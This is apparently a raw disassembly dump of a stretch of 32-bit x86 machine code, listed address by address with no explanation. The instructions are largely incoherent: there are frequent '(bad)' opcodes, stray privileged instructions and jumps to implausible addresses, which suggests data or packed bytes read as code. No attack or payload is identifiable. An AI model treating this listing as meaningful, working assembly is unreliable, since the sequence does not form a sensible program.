  430196:	enter  0x4d45,0xbc
  43019a:	mov    esi,DWORD PTR [edx]
  43019c:	hlt    
  43019d:	test   ebx,ecx
  43019f:	pushf  
  4301a0:	enter  0x4df8,0x8b
  4301a4:	mov    DWORD PTR [ebp+0x8],0x894708
  4301ab:	inc    ebp
  4301ac:	mov    ebp,0xff8bfffc
  4301b1:	dec    ebp
  4301b2:	mov    ch,0xf4
  4301b4:	call   DWORD PTR [ebx-0x1]
  4301b7:	mov    ebx,0x8005474
  4301bc:	call   DWORD PTR [ecx+0x8]
  4301bf:	pop    es
  4301c0:	jmp    0xb8:0xacb4533
  4301c7:	fwait
  4301c8:	mov    esi,DWORD PTR [edx-0xc]
  4301cb:	xor    cl,bl
  4301cd:	add    BYTE PTR [ebx+0x3c83203],bl
  4301d3:	mov    DWORD PTR [ecx+0x4dd0084d],ecx
  4301d9:	mov    eax,DWORD PTR [ebx-0xb9bb3]
  4301df:	xor    eax,DWORD PTR [eax]
  4301e1:	retf   
  4301e2:	retf   
  4301e3:	add    ecx,eax
  4301e5:	enter  0x894d,0x64
  4301e9:	dec    ebp
  4301ea:	sbb    ah,cl
  4301ec:	add    BYTE PTR [ebx-0xb9bb277],cl
  4301f2:	dec    DWORD PTR [ebx-0xbcfb275]
  4301f8:	test   DWORD PTR [ebx],esi
  4301fa:	dec    ebx
  4301fc:	inc    DWORD PTR [ebx]
  4301fe:	inc    eax
  4301ff:	enter  0x8989,0x50
  430203:	(bad)  
  430204:	call   DWORD PTR [ebx+ecx*4-0x1]
  430208:	cld    
  430209:	dec    DWORD PTR [ebp-0xa90001]
  43020f:	push   edi
  430210:	mov    BYTE PTR [edx+0x1],ch
  430213:	and    al,BYTE PTR [eax]
  430215:	pop    ecx
  430216:	inc    ebp
  430217:	mov    DWORD PTR [ebp-0xb2a7f8],ecx
  43021d:	push   0xffffff89
  43021f:	pop    ecx
  430220:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430221:	dec    ebp
  430222:	add    BYTE PTR [ecx+0x45fc088b],cl
  430228:	jne    0x430274
  43022a:	lea    eax,[eax]
  43022c:	push   eax
  43022d:	(bad)  
  43022e:	dec    DWORD PTR [eax]
  430230:	mov    DWORD PTR [eax],eax
  430232:	test   al,0x0
  430234:	add    BYTE PTR [ebp-0x18],cl
  430237:	xor    ebp,DWORD PTR [ebx]
  430239:	add    eax,DWORD PTR [eax]
  43023b:	mov    eax,eax
  43023d:	or     BYTE PTR [ebp+ecx*2+0x3003302],al
  430244:	inc    ebp
  430245:	mov    DWORD PTR [ebx+0x459408],ecx
  43024b:	arpl   WORD PTR [ebx-0x372749b],cx
  430251:	sub    al,0x80
  430253:	inc    DWORD PTR [ecx]
  430255:	lea    eax,[eax]
  430257:	or     al,0x0
  430259:	inc    DWORD PTR [ecx-0x18]
  43025c:	mov    ecx,DWORD PTR [ebx]
  43025e:	cld    
  43025f:	add    BYTE PTR [ecx+0x75014d],cl
  430265:	(bad)  
  430266:	xchg   ebp,eax
  430267:	fdivr  st,st(7)
  430269:	inc    eax
  43026a:	inc    DWORD PTR [eax]
  43026c:	mov    ecx,DWORD PTR [ebp-0x4]
  43026f:	xor    edx,DWORD PTR [edx+0x7201b8]
  430275:	add    BYTE PTR [edx],dl
  430277:	enter  0x4d90,0x0
  43027b:	mov    eax,DWORD PTR [eax]
  43027d:	hlt    
  43027e:	add    al,0xa5
  430280:	mov    al,0xff
  430282:	add    bh,bh
  430284:	add    BYTE PTR [ebx],dh
  430286:	inc    DWORD PTR [ebx]
  430288:	sbb    al,0x89
  43028a:	jne    0x430268
  43028c:	mov    esp,DWORD PTR [ecx+0x4500fc]
  430292:	mov    eax,DWORD PTR [ebp-0xff0048]
  430298:	mov    DWORD PTR [eax-0x70],0xec58ed89
  43029f:	inc    DWORD PTR [ebp-0x75]
  4302a2:	fisttp QWORD PTR [esi+ebp*8]
  4302a5:	test   DWORD PTR [esi-0x1],esp
  4302a8:	inc    ebp
  4302a9:	(bad)  
  4302aa:	aas    
  4302ab:	inc    ebp
  4302ac:	(bad)  
  4302ad:	lea    edi,[esp+eiz*2-0x1]
  4302b1:	inc    edi
  4302b3:	mov    DWORD PTR ds:0x8000c7a0,edi
  4302b9:	mov    ebp,esp
  4302bb:	cld    
  4302bc:	loop   0x43024b
  4302be:	inc    ebp
  4302bf:	(bad)  
  4302c0:	out    dx,al
  4302c1:	(bad)  
  4302c2:	fisttp WORD PTR [eax+0x8801c7]
  4302c8:	jecxz  0x43030f
  4302ca:	in     al,dx
  4302cb:	inc    DWORD PTR [ebp-0x4]
  4302ce:	out    0x8d,eax
  4302d0:	aas    
  4302d1:	inc    edi
  4302d3:	jmp    FWORD PTR [eax-0x78]
  4302d6:	inc    DWORD PTR [ecx]
  4302d8:	mov    DWORD PTR [eax],0xc7043d
  4302de:	ins    BYTE PTR es:[edi],dx
  4302df:	test   edi,edi
  4302e1:	pandn  mm0,mm5
  4302e4:	aas    
  4302e5:	add    bh,al
  4302e7:	mov    esi,DWORD PTR [eax-0x4]
  4302ea:	inc    DWORD PTR [eax+0xdf01ee]
  4302f0:	(bad)  
  4302f1:	or     BYTE PTR [ebp+eax*2-0x1],dh
  4302f5:	mov    ebp,ebx
  4302f7:	xchg   esp,eax
  4302f8:	fild   DWORD PTR [eax]
  4302fa:	(bad)  
  4302fb:	mov    edi,DWORD PTR [eax+0x3]
  4302fe:	(bad)  
  4302ff:	cmp    al,0xe7
  430301:	dec    ebp
  430302:	leave  
  430303:	mov    ebp,eax
  430305:	fsubr  DWORD PTR [edx]
  430307:	add    BYTE PTR [eax],al
  430309:	lea    ecx,[ebx-0x7f0003b4]
  43030f:	push   edx
  430310:	add    DWORD PTR [ebp+0x0],edx
  430313:	mov    esi,DWORD PTR [eax]
  430315:	mov    WORD PTR [edi],ss
  430317:	add    BYTE PTR [eax],al
  430319:	mov    eax,DWORD PTR [ebp-0x74778afd]
  43031f:	add    ah,bh
  430321:	push   0x7d
  430323:	dec    DWORD PTR [ebx+0xd88c]
  430329:	push   edx
  43032a:	mov    edx,DWORD PTR [ecx-0x4]
  43032d:	call   DWORD PTR [eax+0x7d01fc]
  430333:	mov    esi,DWORD PTR [esi]
  430335:	cld    
  430336:	add    BYTE PTR [eax+0x560150],dl
  43033c:	test   DWORD PTR [ebp+0x75],eax
  43033f:	loop   0x4302cc
  430341:	jmp    0xe38b:0x947dc7fc
  430348:	fsub   st,st(7)
  43034a:	add    bh,al
  43034c:	mov    ebx,DWORD PTR [eax-0x7a6f8104]
  430352:	add    edi,edi
  430354:	add    bh,bh
  430356:	adc    al,0xed
  430358:	add    dh,ah
  43035a:	push   eax
  43035b:	inc    ebp
  43035c:	push   esi
  43035d:	fisttp WORD PTR [ebx+0x4dc7f43f]
  430363:	test   BYTE PTR [ebx],dh
  430365:	out    0x5,al
  430367:	shl    BYTE PTR [edx+0x45],0x0
  43036b:	jmp    0x43032e
  43036d:	fild   DWORD PTR [edi+eax*8-0x22ff73ff]
  430374:	inc    esi
  430375:	jle    0x430377
  430377:	test   edi,eax
  430379:	(bad)  
  43037a:	call   0x130047e
  43037f:	out    0x75,al
  430381:	test   DWORD PTR [ebx+0x45fffcff],ecx
  430387:	in     al,dx
  430388:	mov    esp,edx
  43038a:	mov    ah,0x85
  43038c:	add    bh,bh
  43038e:	call   0x1292d92
  430393:	ror    BYTE PTR [ebx-0x7f00037b],0xff
  43039a:	add    ebx,esp
  43039c:	add    ah,ch
  43039e:	xor    BYTE PTR [ebp-0xff0073],al
  4303a4:	mov    ebx,ebp
  4303a6:	cld    
  4303a7:	jle    0x430332
  4303a9:	add    DWORD PTR gs:[eax],eax
  4303ac:	add    BYTE PTR [eax+0x1],dl
  4303af:	inc    ebp
  4303b0:	inc    ebp
  4303b1:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  4303b7:	dec    DWORD PTR [ebx-0x3fd80318]
  4303bd:	add    BYTE PTR [ebp-0xbf0040],dl
  4303c3:	inc    ebp
  4303c4:	fmul   QWORD PTR [ebx-0x4faf0400]
  4303ca:	inc    ebp
  4303cb:	add    DWORD PTR [ebx+0x459c00],ecx
  4303d1:	mov    edi,edi
  4303d3:	mov    eax,0xe80800ff
  4303d8:	inc    ebp
  4303d9:	sub    cl,BYTE PTR [ebx-0x47000400]
  4303df:	add    al,0x1
  4303e1:	rol    BYTE PTR [eax],0x1e
  4303e4:	jne    0x43042b
  4303e6:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  4303ec:	inc    DWORD PTR [ecx]
  4303ee:	call   0x882cf3
  4303f3:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  4303f9:	call   0x432dff
  4303fe:	xor    bh,bh
  430400:	push   edi
  430401:	adc    BYTE PTR [ebx-0x74741bbb],al
  430407:	fsub   st,st(4)
  430409:	ret    
  43040a:	loopne 0x4303a7
  43040c:	xor    DWORD PTR [edx],0x31
  43040f:	cmp    edi,edi
  430411:	bswap  eax
  430413:	rol    BYTE PTR gs:[eax],0x5
  430417:	jmp    0x12e0561
  43041c:	mov    eax,DWORD PTR [ebp-0x4]
  43041f:	add    BYTE PTR [eax+0xff0100],bh
  430425:	cld    
  430426:	jne    0x4304a5
  430428:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  43042e:	jb     0x430431
  430430:	add    BYTE PTR [eax],al
  430432:	push   eax
  430433:	fild   DWORD PTR [ebp+0x0]
  430436:	mov    edx,DWORD PTR [eax-0x68]
  430439:	inc    ebp
  43043a:	add    BYTE PTR [ebx+0xffa8ff],cl
  430440:	or     bh,bh
  430442:	inc    ebp
  430443:	call   0x1272b47
  430448:	jge    0x430497
  43044a:	adc    BYTE PTR [ebx+0x459cb9],cl
  430450:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  430456:	fwait
  430457:	mov    eax,0x30132
  43045c:	lea    esi,[ebp+0x2c]
  43045f:	xor    edi,edi
  430461:	(bad)  
  430462:	call   0x1422dcf
  430467:	call   0x1372df7
  43046c:	jne    0x4303f9
  43046e:	xor    edi,esp
  430470:	add    eax,DWORD PTR [eax+0xc018d]
  430476:	push   DWORD PTR [eax]
  430478:	call   0xcc2dd4
  43047d:	enter  0x45ff,0xe0
  430481:	mov    ecx,DWORD PTR [ebp-0x28]
  430484:	xor    eax,DWORD PTR [eax]
  430486:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  43048c:	(bad)  
  43048d:	xchg   ebp,eax
  43048e:	call   0x1420592
  430493:	mov    cl,0x45
  430495:	add    BYTE PTR [ebx-0x3cbaf7b0],cl
  43049b:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff65]
  4304a2:	mov    edi,edi
  4304a4:	or     BYTE PTR [eax],cl
  4304a6:	inc    ebp
  4304a7:	test   DWORD PTR gs:[eax],eax
  4304aa:	je     0x4304f1
  4304ac:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  4304b2:	xor    edx,DWORD PTR [eax-0x73]
  4304b5:	push   ebp
  4304b6:	or     BYTE PTR [ebp+0x21007572],al
  4304bc:	inc    ebp
  4304bd:	loopne 0x43044a
  4304bf:	sub    BYTE PTR [ebp+eax*2-0x279a743d],bh
  4304c6:	int    0x0
  4304c8:	sub    ecx,DWORD PTR [ebx-0x3f2703fd]
  4304ce:	inc    ebp
  4304cf:	push   ebp
  4304d0:	cmp    ebp,eax
  4304d2:	movaps XMMWORD PTR [eax-0x74740100],xmm4
  4304d9:	cld    
  4304da:	fadd   QWORD PTR [eax+0x3b014d]
  4304e0:	jne    0x430512
  4304e2:	push   0xf8898557
  4304e7:	loopne 0x43055e
  4304e9:	inc    ebp
  4304ea:	lea    eax,[ebx+0x72e8e4cc]
  4304f0:	xor    DWORD PTR [ebx+0x7545bc00],ecx
  4304f6:	jmp    0x43052b
  4304f8:	mov    edi,DWORD PTR [edi+0x4572bc]
  4304fe:	xor    eax,edi
  430500:	adc    DWORD PTR [ebp-0xcd0065],0x8b3d31
  43050a:	rcl    BYTE PTR [eax-0x40],1
  43050d:	inc    ebp
  43050e:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  430516:	inc    ebp
  430517:	xchg   ebp,eax
  430518:	ud0    ebp,DWORD PTR [ebx]
  43051b:	inc    DWORD PTR [eax]
  43051d:	daa    
  43051e:	jbe    0x430520
  430520:	mov    dl,BYTE PTR [eax-0x80]
  430523:	push   ebp
  430524:	pop    ds
  430525:	mov    ecx,DWORD PTR [esp+esi*8]
  430528:	inc    eax
  430529:	retf   
  43052a:	inc    ebp
  43052b:	iret   
  43052c:	jb     0x4304f6
  43052e:	mov    eax,DWORD PTR [edi]
  430530:	int3   
  430531:	inc    ebp
  430532:	inc    ebp
  430533:	add    DWORD PTR [ecx],esi
  430535:	add    BYTE PTR [ebx+ecx*4+0x4df0bc89],bl
  43053c:	xor    dh,BYTE PTR [ebx]
  43053e:	pushf  
  43053f:	lea    ecx,[ecx+0x4d72d808]
  430545:	add    BYTE PTR [ebx],dh
  430547:	inc    ebp
  430548:	mov    DWORD PTR [ebx-0x3f64174c],ecx
  43054e:	xor    dl,BYTE PTR [edx]
  430550:	add    eax,DWORD PTR [ebp-0x77]
  430553:	mov    eax,esp
  430555:	fmul   QWORD PTR [ebp-0x3d]
  430558:	xor    eax,DWORD PTR [ebx+eax*1+0x832899b]
  43055f:	mov    DWORD PTR [ebp-0x24],eax
  430562:	rol    DWORD PTR [ebp-0x64],1
  430565:	xor    eax,edi
  430567:	mov    ecx,0xff858db0
  43056c:	clc    
  43056d:	enter  0x4d45,0x3c
  430571:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  430578:	test   esi,edi
  43057a:	clc    
  43057b:	inc    DWORD PTR [ebp+0x45]
  43057e:	mov    ebx,DWORD PTR ds:[eax+ecx*1+0x16a8c8c7]
  430586:	test   DWORD PTR [ecx],esi
  430588:	clc    
  430589:	pushf  
  43058a:	inc    ebp
  43058b:	(bad)  
  43058c:	cmp    ah,bh
  43058e:	pushf  
  43058f:	inc    ebp
  430590:	mov    edx,DWORD PTR [eax-0x24]
  430593:	add    BYTE PTR [ebp+0x0],dl
  430596:	xor    ecx,DWORD PTR [ecx+0x103bd003]
  43059c:	cmovge edx,DWORD PTR [ebx+ecx*4]
  4305a0:	add    al,dl
  4305a2:	jmp    0x1040772
  4305a7:	jb     0x4305f6
  4305a9:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  4305af:	xor    ecx,DWORD PTR [ebp+0x3b]
  4305b2:	xor    ecx,DWORD PTR [edi]
  4305b4:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  4305b8:	(bad)  
  4305ba:	clc    
  4305bb:	int3   
  4305bc:	add    BYTE PTR [ebx+ecx*4+0x5500b007],al
  4305c3:	push   cs
  4305c4:	xor    ecx,eax
  4305c6:	xor    esp,ecx
  4305c8:	add    ebp,DWORD PTR [eax]
  4305ca:	add    esi,DWORD PTR [eax]
  4305cc:	(bad)  
  4305ce:	retf   0x55cc
  4305d1:	repnz mov eax,DWORD PTR [ebp-0x10]
  4305d5:	(bad)  
  4305d6:	cli    
  4305d7:	fdiv   st(1),st
  4305d9:	test   DWORD PTR [eax+edi*8],ecx
  4305dc:	dec    ebp
  4305dd:	inc    ebp
  4305de:	xor    edi,DWORD PTR [eax-0x7167afd]
  4305e4:	add    BYTE PTR [ebp+0x0],al
  4305e7:	mov    ecx,DWORD PTR [ebp-0x24]
  4305ea:	mov    ecx,ebx
  4305ec:	clc    
  4305ed:	jne    0x4305ba
  4305ef:	mov    esi,0xd672d3
  4305f4:	into   
  4305f5:	into   
  4305f6:	scas   eax,DWORD PTR es:[edi]
  4305f7:	dec    ebp
  4305f8:	mov    ecx,DWORD PTR [ebx-0x3482233c]
  4305fe:	sub    ecx,esi
  430600:	cmp    ecx,DWORD PTR [ebp+0x77]
  430603:	(bad)  
  430604:	mov    edi,eax
  430606:	mov    al,0x85
  430608:	mov    eax,edi
  43060a:	add    BYTE PTR [ebp-0x75],al
  43060d:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  430614:	xor    eax,DWORD PTR [ebp+0x4503f803]
  43061a:	(bad)  
  43061c:	retf   0x559c
  43061f:	(bad)  
  430620:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  430627:	inc    ebp
  430628:	add    eax,0xeb9c4d3f
  43062d:	(bad)  
  43062e:	mov    ecx,eax
  430630:	lods   al,BYTE PTR ds:[esi]
  430631:	test   DWORD PTR [ebp-0x8],edx
  430634:	xor    ecx,DWORD PTR [ebp+0x33]
  430637:	mov    eax,DWORD PTR [ebx]
  430639:	lock add ecx,ebx
  43063c:	bswap  esi
  43063e:	retf   0x55d1
  430641:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  430647:	jmp    0x430642
  430649:	add    BYTE PTR ds:0xebc44d8b,al
  43064f:	push   ebp
  430650:	mov    ebp,DWORD PTR [ebx]
  430652:	test   al,0x8b
  430654:	push   ebp
  430655:	clc    
  430656:	xor    ecx,ebx
  430658:	xor    ecx,esi
  43065a:	add    edx,ecx
  43065c:	add    eax,DWORD PTR [edx+0xca010f]
  430662:	push   ebp
  430663:	dec    ebp
  430664:	mov    ecx,DWORD PTR [ebx-0x34050710]
  43066a:	stc    
  43066b:	rol    DWORD PTR ds:0xebce4dd6,cl
  430671:	scas   eax,DWORD PTR es:[edi]
  430672:	mov    ecx,DWORD PTR [ebx+0x7d55c4c8]
  430678:	xor    ebp,DWORD PTR [ebx]
  43067a:	xor    edi,DWORD PTR [ebx]
  43067c:	add    esi,DWORD PTR [edi+0x3]
  43067f:	mov    ecx,DWORD PTR [edi]
  430681:	clc    
  430682:	retf   0x55cb
  430685:	into   
  430686:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  43068d:	mov    eax,0x3376554d
  430692:	mov    esi,DWORD PTR [ebx]
  430694:	enter  0x5503,0x3
  430698:	xor    ecx,DWORD PTR [edi]
  43069a:	xor    ecx,edx
  43069c:	add    edx,DWORD PTR [ebp+0x3]
  43069f:	mov    ecx,DWORD PTR [edi]
  4306a1:	lock retf 0x4dfa
  4306a5:	stc    
  4306a6:	mov    ecx,DWORD PTR [eax]
  4306a8:	or     BYTE PTR [ebp+0x4d],cl
  4306ab:	jmp    0x107073b
  4306b0:	dec    ebp
  4306b1:	dec    ebp
  4306b2:	(bad)  
  4306b3:	mov    esp,esp
  4306b5:	clc    
  4306b6:	test   ebx,ecx
  4306b8:	clc    
  4306b9:	ror    DWORD PTR [ebp-0x2a],cl
  4306bc:	mov    esi,ecx
  4306be:	in     al,dx
  4306bf:	scas   eax,DWORD PTR es:[edi]
  4306c0:	inc    ebp
  4306c1:	mov    esi,DWORD PTR [ebx]
  4306c3:	les    ebx,FWORD PTR [ebp+edi*2+0x3be42b8b]
  4306ca:	retf   
  4306cb:	ja     0x43069b
  4306cd:	mov    ebp,DWORD PTR [eax-0x48]
  4306d0:	dec    ebp
  4306d1:	xor    ecx,DWORD PTR [di+0x3]
  4306d5:	mov    ebp,eax
  4306d7:	clc    
  4306d8:	push   ebp
  4306d9:	retf   
  4306da:	mov    dl,bl
  4306dc:	adc    esi,edx
  4306de:	jb     0x4306ae
  4306e0:	add    BYTE PTR [edi-0x3b7474b3],ch
  4306e6:	in     al,dx
  4306e7:	jge    0x4306b4
  4306e9:	sub    ecx,DWORD PTR [ebp+0x3b]
  4306ec:	mov    esi,DWORD PTR [edi-0x24]
  4306ef:	mov    ecx,DWORD PTR [esp+eiz*4+0x4d32459b]
  4306f6:	mov    BYTE PTR [ebx-0x34b20729],cl
  4306fc:	mov    edx,ebx
  4306fe:	in     al,dx
  4306ff:	(bad)  
  430700:	ror    esi,cl
  430702:	push   ebp
  430703:	scas   eax,DWORD PTR es:[edi]
  430704:	mov    ecx,DWORD PTR [ebx+0x7d8cc4dc]
  43070a:	fwait
  43070b:	sub    esi,DWORD PTR [edx]
  43070d:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  430713:	lods   al,BYTE PTR ds:[esi]
  430714:	xor    esp,DWORD PTR [ebx]
  430716:	add    ecx,DWORD PTR [ebp-0x18]
  430719:	mov    edi,DWORD PTR [ebp-0x8]
  43071c:	mov    bl,cl
  43071e:	cmp    dl,bl
  430720:	jb     0x4306f0
  430722:	add    dh,dl
  430724:	dec    ebp
  430725:	scas   eax,DWORD PTR es:[edi]
  430726:	mov    ecx,DWORD PTR [ebx+0x7dcbc4ec]
  43072c:	shr    DWORD PTR [ebx],cl
  43072e:	into   
  43072f:	cmp    edx,esi
  430731:	mov    ebp,DWORD PTR [edi-0x17fcfc58]
  430737:	dec    ebp
  430738:	dec    ebp
  430739:	mov    ecx,DWORD PTR [ebx+0x55d3ecf8]
  43073f:	retf   
  430740:	xor    edx,esi
  430742:	add    ecx,esi
  430744:	imul   ecx,edx
  430747:	mov    DWORD PTR [ebp+0x8],edx
  43074a:	xor    ecx,DWORD PTR [ebp+0x2b]
  43074d:	mov    DWORD PTR [ebx+0x7d4dece0],ecx
  430753:	add    esi,DWORD PTR [ebx]
  430755:	mov    ah,0x3
  430757:	inc    ebp
  430758:	rdtsc  
  43075a:	xlat   BYTE PTR ds:[ebx]
  43075b:	pushf  
  43075c:	jge    0x4306e7
  43075e:	xor    ebx,esp
  430760:	sub    eax,DWORD PTR [ebp-0x73]
  430763:	(bad)  
  430764:	cmp    al,al
  430766:	jb     0x4306ed
  430768:	add    al,bh
  43076a:	ror    DWORD PTR [ebp-0x7a],1
  43076d:	xor    edi,edi
  43076f:	add    edi,edi
  430771:	jmp    0x4307c0
  430773:	mov    ecx,DWORD PTR [ebx-0x34341f1c]
  430779:	dec    ebp
  43077a:	into   
  43077b:	mov    ebp,DWORD PTR [edi-0x1b737424]
  430781:	fwait
  430782:	shl    DWORD PTR [edx],cl
  430784:	retf   0x5588
  430787:	or     ecx,DWORD PTR [ebp+0x7233114d]
  43078d:	add    eax,DWORD PTR [eax]
  43078f:	call   0x8ace5ce1
  430794:	fcom   DWORD PTR [ecx]
  430796:	retf   
  430797:	jb     0x4307fe
  430799:	add    ch,cl
  43079b:	dec    ebp
  43079c:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  4307a2:	dec    ebp
  4307a3:	xor    ecx,DWORD PTR [ebx-0x34173bfd]
  4307a9:	jge    0x430779
  4307ab:	mov    BYTE PTR [edi+0xf723b3a],ch
  4307b1:	add    cl,dh
  4307b3:	dec    ebp
  4307b4:	dec    DWORD PTR [ebx-0x2c031b75]
  4307ba:	adc    BYTE PTR [ebp+0x1],0x8b
  4307be:	add    ah,bl
  4307c0:	jge    0x43074e
  4307c2:	push   0xffffff9b
  4307c4:	push   0x8b3032
  4307c9:	shl    BYTE PTR [ebp+0x55],0x6a
  4307cd:	xor    edi,edi
  4307cf:	xor    edx,DWORD PTR [ebx+eax*1]
  4307d2:	inc    ebp
  4307d3:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  4307d9:	dec    ebp
  4307da:	or     BYTE PTR [ecx+0x4dcce883],cl
  4307e0:	jbe    0x43076d
  4307e2:	mov    esp,eax
  4307e4:	ror    bl,1
  4307e6:	enter  0x14ce,0xaf
  4307ea:	dec    DWORD PTR [ebx-0x2cef13f8]
  4307f0:	push   ebp
  4307f1:	retf   0x5540
  4307f4:	push   ebp
  4307f5:	mov    esi,DWORD PTR [edx-0x18]
  4307f8:	mov    edx,ebx
  4307fa:	cld    
  4307fb:	(bad)  
  4307fc:	sub    BYTE PTR [edi-0x1bff74ff],0x0
  430803:	sti    
  430804:	add    dh,cl
  430806:	push   0xffffff94
  430808:	call   FWORD PTR [ebx+0x3b5032d0]
  43080e:	mov    ecx,DWORD PTR [edi]
  430810:	enter  0x455e,0xff
  430814:	mov    DWORD PTR [ebx+0x5545eccc],ecx
  43081a:	xor    esi,DWORD PTR [ebx]
  43081c:	mov    DWORD PTR [ebx],0xcace0f9c
  430822:	aas    
  430823:	push   ebp
  430824:	inc    ebp
  430825:	xor    edx,esi
  430827:	add    edx,esi
  430829:	mov    eax,DWORD PTR [ebx]
  43082b:	(bad)  
  43082c:	jmp    0x4307ba
  43082e:	mov    bl,BYTE PTR [ebx-0x7674cdfb]
  430834:	rol    ah,1
  430836:	mov    esi,0xf133104d
  43083b:	mov    edx,0xff388d80
  430840:	mov    dh,0xd1
  430842:	cmp    edx,DWORD PTR [ebp+0xf]
  430845:	mov    eax,DWORD PTR [edx-0x28]
  430848:	add    BYTE PTR [ebp-0x75],bh
  43084b:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  430852:	fwait
  430853:	retf   0x8632
  430856:	cmp    ebp,0x8
  430859:	call   ebx
  43085b:	inc    ebp
  43085c:	inc    ebp
  43085d:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  430863:	mov    esi,DWORD PTR [ecx]
  430865:	int3   
  430866:	pushf  
  430867:	add    al,0xc7
  430869:	add    al,al
  43086b:	add    bl,al
  43086d:	(bad)  
  43086e:	clc    
  43086f:	int3   
  430870:	inc    ebp
  430871:	add    BYTE PTR [ecx],dh
  430873:	push   eax
  430874:	pushf  
  430875:	mov    edi,eax
  430877:	enter  0xc008,0x85
  43087b:	aas    
  43087c:	clc    
  43087d:	gs inc ebp
  43087f:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  430885:	push   ss
  430886:	xor    ecx,DWORD PTR [ebp+0x3]
  430889:	sub    edx,DWORD PTR [ecx-0x76]
  43088c:	dec    ebp
  43088d:	add    DWORD PTR [ebx+0x88d845],ecx
  430893:	mov    esi,DWORD PTR [ebx]
  430895:	or     BYTE PTR [ebx],al
  430897:	cmp    edx,DWORD PTR [ecx-0x34]
  43089a:	dec    ebp
  43089b:	out    dx,eax
  43089c:	xor    eax,DWORD PTR [ebp+0x3]
  43089f:	mov    edx,DWORD PTR [ecx-0x28]
  4308a2:	dec    ebp
  4308a3:	add    BYTE PTR [ebx],dh
  4308a5:	push   0x518003
  4308aa:	push   eax
  4308ab:	add    BYTE PTR [ebx-0x300748b],cl
  4308b1:	sbb    BYTE PTR [ebp+0x45],cl
  4308b4:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  4308ba:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  4308c0:	dec    ebp
  4308c1:	inc    ebp
  4308c2:	xor    edx,esi
  4308c4:	add    edx,esi
  4308c6:	push   ecx
  4308c7:	(bad)  
  4308c8:	dec    ebp
  4308c9:	mov    al,ds:0xc5d83dff
  4308ce:	retf   
  4308cf:	(bad)  
  4308d0:	into   
  4308d1:	sub    bh,bh
  4308d3:	dec    esp
  4308d4:	adc    al,0x9c
  4308d6:	inc    ebp
  4308d7:	push   ebp
  4308d8:	test   DWORD PTR [edi],ecx
  4308da:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab9ff80]
  4308e1:	jmp    0xc9bc17f5
  4308e6:	add    cl,dl
  4308e8:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  4308f2:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  4308f8:	rol    BYTE PTR [eax],0x54
  4308fb:	clc    
  4308fc:	gs jb  0x430906
  4308ff:	mov    eax,DWORD PTR [ebp-0x30]
  430902:	xor    al,0x40
  430904:	sub    al,0xc7
  430906:	mov    al,ah
  430908:	add    DWORD PTR [ebp+0x4534f845],eax
  43090e:	sub    al,0x80
  430910:	mov    BYTE PTR [edx+eax*1-0x375a39],bl
  430917:	mov    ch,0xff
  430919:	clc    
  43091a:	add    DWORD PTR [ebp+0x60],0x3d
  43091e:	call   FWORD PTR [eax+eax*1-0x277a77]
  430925:	inc    ebp
  430926:	dec    DWORD PTR [ebx-0x3427f701]
  43092c:	test   esi,ecx
  43092e:	dec    DWORD PTR [ebx-0x7f8a3701]
  430934:	push   eax
  430935:	add    DWORD PTR [ebp+0x0],eax
  430938:	dec    ebx
  43093a:	or     al,0xce
  43093c:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  430943:	into   
  430944:	add    BYTE PTR [ebx-0x34ff2000],cl
  43094a:	mov    esi,ecx
  43094c:	sar    bh,0x45
  43094f:	adc    al,0x8b
  430951:	clc    
  430952:	fadd   DWORD PTR [ebp+0x0]
  430955:	mov    ebp,DWORD PTR [edx+0x8]
  430958:	push   edi
  430959:	adc    BYTE PTR [eax+0x1],0x83
  43095d:	add    al,al
  43095f:	retf   
  430960:	mov    ecx,esi
  430962:	cld    
  430963:	mov    eax,DWORD PTR [eax+0xcb01c8]
  430969:	into   
  43096a:	add    BYTE PTR [ebx+0x756ae000],cl
  430970:	jne    0x4309a5
  430972:	inc    DWORD PTR [ebx]
  430974:	rcl    BYTE PTR [ecx+0x50],1
  430977:	push   eax
  430978:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  43097e:	mov    eax,DWORD PTR [eax+ebx*8-0x14ffbafd]
  430985:	sar    bh,0x84
  430988:	or     BYTE PTR [ebx],al
  43098a:	push   eax
  43098b:	add    BYTE PTR [ebx+0x453ccc45],cl
  430991:	pushf  
  430992:	xor    edi,eax
  430994:	pushf  
  430995:	mov    ah,0x89
  430997:	test   esp,ebp
  430999:	clc    
  43099a:	inc    ebp
  43099b:	inc    ebp
  43099c:	mov    DWORD PTR [eax+eax*8],esi
  43099f:	sub    al,0x32
  4309a1:	mov    BYTE PTR [ebx+ecx*4+0x54dce089],bl
  4309a8:	dec    ebp
  4309a9:	xor    eax,DWORD PTR gs:[edi+0x3]
  4309ad:	mov    ecx,DWORD PTR [ecx+0x4d54f4b4]
  4309b3:	xor    eax,DWORD PTR gs:[edi+0x3]
  4309b7:	or     DWORD PTR [ecx+0x45ff085c],0x0
  4309be:	shl    DWORD PTR [ebp-0x380064],1
  4309c4:	enter  0x858d,0x60
  4309c8:	clc    
